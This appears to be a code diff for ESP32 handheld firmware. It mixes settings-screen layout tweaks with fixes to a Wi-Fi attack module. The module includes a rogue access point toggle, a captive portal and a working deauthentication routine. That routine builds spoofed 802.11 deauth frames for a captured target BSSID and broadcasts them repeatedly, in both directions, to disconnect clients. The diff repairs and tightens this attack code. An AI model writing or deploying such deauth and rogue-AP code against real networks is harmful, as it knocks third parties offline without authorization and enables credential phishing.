@@ -363,9 +363,10 @@ void stopCaptivePortal() {
 // Stop WiFi attack (deactivate the rogue AP)
 void stopWifiAttack() {
   if (wifiAttackActive) {
-  WiFi.softAPdisconnect(true);
-  wifiAttackActive = false;
-  showToast("WiFi attack stopped");
+    WiFi.softAPdisconnect(true);
+    wifiAttackActive = false;
+    showToast("WiFi attack stopped");
+  }
 }
 
 // Send deauthentication frames to disconnect clients from target AP
@@ -375,59 +376,44 @@ void sendDeauthAttack() {
     return;
   }
   
-  // Set WiFi to station mode to send deauth frames
   WiFi.mode(WIFI_STA);
-  WiFi.setChannel(deauthTargetChannel);
+  esp_wifi_set_channel(deauthTargetChannel, WIFI_SECOND_CHAN_NONE);
   WiFi.setTxPower(WIFI_POWER_19_5dBm);
   
-  // Construct deauth frame: AP -> Client
   uint8_t deauthFrame[26] = {
-    0xC0, 0x00,   // Frame control: deauth from AP
-    0x00, 0x00,   // Duration
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   // Destination: broadcast (all clients)
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Source: will be set below
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // BSSID: will be set below
-    0x00, 0x00,   // Sequence control
-    0x01, 0x00    // Reason code: 1 (unspecified reason)
+    0xC0, 0x00,
+    0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00,
+    0x01, 0x00
   };
   
-  // Copy target BSSID to source and BSSID fields
-  if (deauthTargetBSSID.length() == 17) { // MAC address format: XX:XX:XX:XX:XX:XX
-    uint8_t mac[6];
-    sscanf(deauthTargetBSSID.c_str(), "%x:%x:%x:%x:%x:%x", 
-           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
-    memcpy(&deauthFrame[10], mac, 6);   // Source MAC
-    memcpy(&deauthFrame[16], mac, 6);   // BSSID
+  if (deauthTargetBSSID.length() == 17) {
+    uint32_t m[6];
+    if (sscanf(deauthTargetBSSID.c_str(), "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
+      for (int i = 0; i < 6; i++) {
+        deauthFrame[10 + i] = (uint8_t)m[i];
+        deauthFrame[16 + i] = (uint8_t)m[i];
+      }
+    }
   }
   
-  // Send multiple deauth frames
   for (int i = 0; i < 50; i++) {
-    // Send AP -> Client deauth
     esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
     
-    // Construct Client -> AP deauth (flip source and destination)
     uint8_t deauthFrameClient[26];
     memcpy(deauthFrameClient, deauthFrame, sizeof(deauthFrame));
-    // Swap source and destination
-    memcpy(&deauthFrameClient[0], &deauthFrame[4], 6);   // Dest = original source
-    memcpy(&deauthFrameClient[4], &deauthFrame[0], 6);   // Source = original dest
+    memcpy(&deauthFrameClient[0], &deauthFrame[4], 6);
+    memcpy(&deauthFrameClient[4], &deauthFrame[0], 6);
     
-    // Send Client -> AP deauth
     esp_wifi_80211_tx(WIFI_IF_STA, deauthFrameClient, sizeof(deauthFrameClient), false);
-    
-    delay(10); // Small delay between frames
+    delay(10);
   }
   
-   showToast("Deauth attack sent");
+  showToast("Deauth attack sent");
 }
-#ifdef __cplusplus
-extern "C" {
-#endif
-void esp_wifi_80211_tx(wifi_interface_t ifx, const void *buffer, int len, bool en_sys_seq);
-#ifdef __cplusplus
-}
-#endif
-
 void loadPortalFromSD() {
   if (!SD.begin(Board::kSdCs)) {
     showToast("SD not found");
@@ -1884,37 +1870,36 @@ void drawSettings() {
 
   // Theme
   String themeName = themeIndex == 0 ? "Ocean" : "Midnight";
-  card(12, 36, 296, 28, "Theme", themeName + " - tap to change");
+  card(12, 36, 296, 25, "Theme", themeName + " - tap to change");
 
   // Sleep
-  card(12, 68, 296, 28, "Screen Sleep", sleepLabel() + " - tap to change");
+  card(12, 63, 296, 25, "Screen Sleep", sleepLabel() + " - tap to change");
 
   // Timezone
   String zone = "UTC" + String(utcOffset >= 0 ? "+" : "") + String(utcOffset);
-  card(12, 100, 296, 28, "Timezone", zone + " - tap to change");
+  card(12, 90, 296, 25, "Timezone", zone + " - tap to change");
 
   // LED backlight colour
   static const char* kLedNames[] = {"Off", "Red", "Green", "Blue", "White"};
-  card(12, 132, 296, 28, "LED Backlight",
+  card(12, 117, 296, 25, "LED Backlight",
        String(kLedNames[ledColorIndex]) + " - tap to change");
 
   // Cloud API shortcut
-  card(12, 164, 296, 28, "Cloud API",
+  card(12, 144, 296, 25, "Cloud API",
        bridgeUrl.length() ? trimText(bridgeUrl, 28) : "Not configured");
 
   // Forget Wi-Fi
-  card(12, 196, 296, 28, "Forget Wi-Fi", "Clear saved network");
+  card(12, 171, 296, 25, "Forget Wi-Fi", "Clear saved network");
 
-  // Bottom
-  card(12, 228, 68, 20, "Back");
+  // Prominent, clearly visible Back button
+  card(12, 200, 96, 32, "< Back");
 
   // Version + memory info
   tft.setTextColor(c.muted, c.background);
   tft.setTextSize(1);
   String info = "v" FW_VERSION " | " + String(ESP.getFreeHeap() / 1024) + "KB free";
-  tft.drawRightString(info, 308, 232, 1);
+  tft.drawRightString(info, 308, 210, 1);
 }
-
 void drawBridge() {
   const Theme& c = theme();
   tft.fillScreen(c.background);
@@ -2375,34 +2360,34 @@ void handleTap(int x, int y) {
       navigateTo(Page::Home);
     }
   } else if (currentPage == Page::Settings) {
-    if (y >= 36 && y < 64) {
+    if (y >= 35 && y < 62) {
       themeIndex = (themeIndex + 1) % kThemeCount;
       saveSettings();
       pageNeedsRedraw = true;
-    } else if (y >= 68 && y < 96) {
+    } else if (y >= 62 && y < 89) {
       sleepIndex = (sleepIndex + 1) % 4;
       saveSettings();
       showToast("Sleep: " + sleepLabel());
       pageNeedsRedraw = true;
-    } else if (y >= 100 && y < 128) {
+    } else if (y >= 89 && y < 116) {
       utcOffset = utcOffset >= 14 ? -12 : utcOffset + 1;
       ntpStarted = false;
       startClock();
       saveSettings();
       pageNeedsRedraw = true;
-    } else if (y >= 132 && y < 160) {
+    } else if (y >= 116 && y < 143) {
       // LED backlight colour cycle: Off -> Red -> Green -> Blue -> White -> Off
       ledColorIndex = (ledColorIndex + 1) % 5;
       applyLedColor();
       saveSettings();
       pageNeedsRedraw = true;
-    } else if (y >= 164 && y < 192) {
+    } else if (y >= 143 && y < 170) {
       navigateTo(Page::Bridge);
-    } else if (y >= 196 && y < 224) {
+    } else if (y >= 170 && y < 198) {
       WiFi.disconnect(true, true);
       showToast("Wi-Fi credentials cleared");
       pageNeedsRedraw = true;
-    } else if (y >= 228) {
+    } else if (y >= 198) {
       navigateTo(Page::Home);
     }
   } else if (currentPage == Page::Bridge) {
@@ -2667,8 +2652,8 @@ void handleTap(int x, int y) {
           }
           
           // Get AP information (even if not fully connected, we might get BSSID)
-          if (WiFi.BSSIDStr() != nullptr) {
-            deauthTargetBSSID = WiFi.BSSIDStr();
+          String bssid = WiFi.BSSIDstr(); if (bssid.length() > 0 && bssid != "00:00:00:00:00:00") {
+            deauthTargetBSSID = bssid;
             deauthTargetChannel = WiFi.channel();
             showToast("Target AP: " + deauthTargetBSSID + " Ch:" + String(deauthTargetChannel));
           } else {
